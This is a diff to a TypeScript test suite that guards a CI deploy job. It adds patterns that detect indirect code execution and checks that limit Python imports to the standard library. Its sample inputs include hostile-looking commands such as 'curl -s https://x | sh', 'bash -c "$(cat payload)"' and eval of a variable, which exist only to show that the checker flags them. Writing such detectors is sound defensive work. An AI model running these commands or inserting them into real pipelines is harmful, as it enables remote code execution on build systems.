@@ -1,3 +1,4 @@
+import { spawnSync } from "node:child_process";
 import { existsSync, mkdtempSync, readFileSync, readdirSync, rmSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import path from "node:path";
@@ -123,7 +124,66 @@ function invocationFindings(where: string, text: string): string[] {
   }
   const run = RUNS_A_PACKAGE.exec(uncommented(text));
   if (run !== null) findings.push(`${where}: ${run[0]}`);
+  // Other ways to start code the reader cannot follow (review round 2), each refused outright.
+  for (const [name, pattern] of INDIRECT) {
+    const found = pattern.exec(uncommented(text).replace(SOURCES_COMMON, ""));
+    if (found !== null) findings.push(`${where}: ${name}: ${found[0].trim()}`);
+  }
   return findings;
+}
+
+// Command position, as in STARTS.
+const AT = "(?:^[ \\t]*|[;|&(\u0060][ \\t]*|\\b(?:then|do|else|if|run:)[ \\t]+)";
+const INDIRECT: [string, RegExp][] = [
+  ["eval", new RegExp(`${AT}eval\\b`, "m")],
+  ["a pipe into a shell", /\|\s*(?:ba)?sh\b/],
+  ["a shell given a command string", /\b(?:ba)?sh\s+(?:-\w*\s+)*-\w*c\b/],
+  [
+    "node told to preload or load code",
+    /\bnode\b[^\n]*\s(?:--import|--require|-r|--loader|--experimental-loader)\b/,
+  ],
+  ["node given code from a variable", /\bnode\s+(?:-\w+\s+)*-[ep]\s+["']?\$/],
+  [
+    "an interpreter started through env, command or exec",
+    /\b(?:env|command|exec)\s+(?:\S+=\S*\s+)*(?:node|python3?|bash|sh|perl)\b/,
+  ],
+  // A lone "." before a redirection is an argument continued from the line above (gcloud builds
+  // submit's source directory), not a dot-source.
+  ["a dot-source", new RegExp(`${AT}\\.[ \t]+(?!\\d?>)\\S`, "m")],
+  ["a script run as a command", new RegExp(`${AT}(?:\\./)?scripts/[\\w/.-]+`, "m")],
+  ["perl", /\bperl\b/],
+];
+
+// The Python the job runs: the code of each `python3 -c` string and each heredoc fed to
+// `python3 -`, and the repository's Python files it starts. Each may import the standard library
+// and the repository's own scripts/ci modules only.
+const STDLIB = new Set(
+  spawnSync("python3", ["-c", "import sys;print(' '.join(sorted(sys.stdlib_module_names)))"], {
+    encoding: "utf8",
+  })
+    .stdout.split(" ")
+    .map((name) => name.trim()),
+);
+function pythonCode(text: string): string[] {
+  return [
+    ...[...text.matchAll(/python3 -c (["'])((?:\\.|(?!\1)[^\\])*)\1/g)].map((m) => m[2] ?? ""),
+    ...[...text.matchAll(/python3 -[^\n]*<<'(\w+)'[^\n]*\n([\s\S]*?)^\1$/gm)].map(
+      (m) => m[2] ?? "",
+    ),
+  ];
+}
+function pythonImports(code: string): string[] {
+  return [
+    ...[...code.matchAll(/(?:^|[;\n])\s*import\s+([\w.]+(?:\s*,\s*[\w.]+)*)/g)].flatMap((m) =>
+      (m[1] ?? "").split(",").map((name) => name.trim()),
+    ),
+    ...[...code.matchAll(/(?:^|[;\n])\s*from\s+([\w.]+)\s+import\b/g)].map((m) => m[1] ?? ""),
+  ].map((name) => name.split(".")[0] ?? "");
+}
+function pythonFindings(where: string, code: string): string[] {
+  return pythonImports(code)
+    .filter((name) => !STDLIB.has(name) && !existsSync(`scripts/ci/${name}.py`))
+    .map((name) => `${where}: Python imports ${name}`);
 }
 
 const deployScript = shell(readFileSync("scripts/gcp/deploy.sh", "utf8"));
@@ -211,6 +271,19 @@ function nodeScripts(texts: Iterable<string>): Set<string> {
 // Everything wrong with what the deploy job runs: an empty list is the rule held.
 function deployJobFindings(reached: Map<string, string>): string[] {
   const findings = [...reached].flatMap(([where, text]) => invocationFindings(where, text));
+  // Python, read from the whole of each file reached (a function's heredocs are stripped above),
+  // and from each Python file started.
+  const files = [...reached.keys()].filter((where) => /^scripts\/.*\.sh$/.test(where));
+  for (const file of ["scripts/gcp/deploy.sh", ...files]) {
+    for (const code of pythonCode(readFileSync(file, "utf8"))) {
+      findings.push(...pythonFindings(file, code));
+    }
+  }
+  for (const text of reached.values()) {
+    for (const [, file] of uncommented(text).matchAll(/\bpython3 (scripts\/[\w/.-]+\.py)\b/g)) {
+      findings.push(...pythonFindings(file ?? "", readFileSync(file ?? "", "utf8")));
+    }
+  }
   for (const script of nodeScripts(reached.values())) {
     for (const imported of nodeImports(script)) {
       if (!/: node:[a-z/_]+$/.test(imported)) findings.push(imported);
@@ -251,7 +324,12 @@ describe("the job that can become the deployer", () => {
 
   it("uses only the actions it names, pinned, and checks its inputs before any credential", () => {
     const deployJob = byName.get("deploy") ?? "";
-    const uses = [...deployJob.matchAll(/^\s+uses: (\S+)/gm)].map((m) => m[1] ?? "");
+    // Every form a step can name an action in: `uses:`, `- uses:`, and a flow mapping
+    // `- { uses: … }` (review round 2); counted against every occurrence, so none is missed.
+    const uses = [...deployJob.matchAll(/^\s*-?\s*\{?\s*uses:\s*([^\s,}]+)/gm)].map(
+      (m) => m[1] ?? "",
+    );
+    expect(uses).toHaveLength(uncommented(deployJob).match(/\buses:/g)?.length ?? -1);
     const pinned = uses.map((use) => /^([\w./-]+)@[0-9a-f]{40}$/.exec(use)?.[1] ?? use);
     expect(pinned).toEqual([
       "actions/checkout",
@@ -289,6 +367,21 @@ describe("the job that can become the deployer", () => {
       'bash "$ROOT/scripts/gcp/other.sh"',
       "npm run standards:fetch",
       "node_modules/.bin/tsx scripts/fhir/export-fixture.ts out.json in.json",
+      // Review round 2.
+      'eval "$COMMAND"',
+      "curl -s https://x | sh",
+      'bash -c "$(cat payload)"',
+      "node --import ./hook.mjs scripts/fhir/fetch-standards.mjs",
+      "node -r ./hook.cjs scripts/fhir/fetch-standards.mjs",
+      "node --loader ./hook.mjs scripts/fhir/fetch-standards.mjs",
+      'node -e "$CODE"',
+      "node -p $CODE",
+      "env node scripts/fhir/fetch-standards.mjs",
+      "command node scripts/fhir/fetch-standards.mjs",
+      '. "$ROOT/scripts/gcp/other.sh"',
+      "scripts/gcp/other.sh",
+      "./scripts/gcp/other.sh",
+      "perl -e 'print 1'",
     ]) {
       expect([line, withLine(boot, reached.get(boot) ?? "", line)]).toEqual([
         line,
@@ -317,6 +410,20 @@ describe("the job that can become the deployer", () => {
     }
     expect(nodeImports("scripts/fhir/export-fixture.ts").some((i) => !i.includes(": node:"))).toBe(
       true,
+    );
+    // Python outside the standard library, inline or in a heredoc.
+    expect(
+      pythonFindings(boot, pythonCode('python3 -c "import requests; print(1)"').join("\n")),
+    ).toEqual([`${boot}: Python imports requests`]);
+    expect(
+      pythonCode("x=\"$(python3 - a <<'PY'\nimport json\nfrom yaml import load\nPY\n)\"").flatMap(
+        (c) => pythonFindings(boot, c),
+      ),
+    ).toEqual([`${boot}: Python imports yaml`]);
+    // The compact and flow forms of an action step.
+    const flow = "      - { uses: evil/action@0123456789012345678901234567890123456789 }";
+    expect(/^\s*-?\s*\{?\s*uses:\s*([^\s,}]+)/m.exec(flow)?.[1]).toBe(
+      "evil/action@0123456789012345678901234567890123456789",
     );
   });
 });
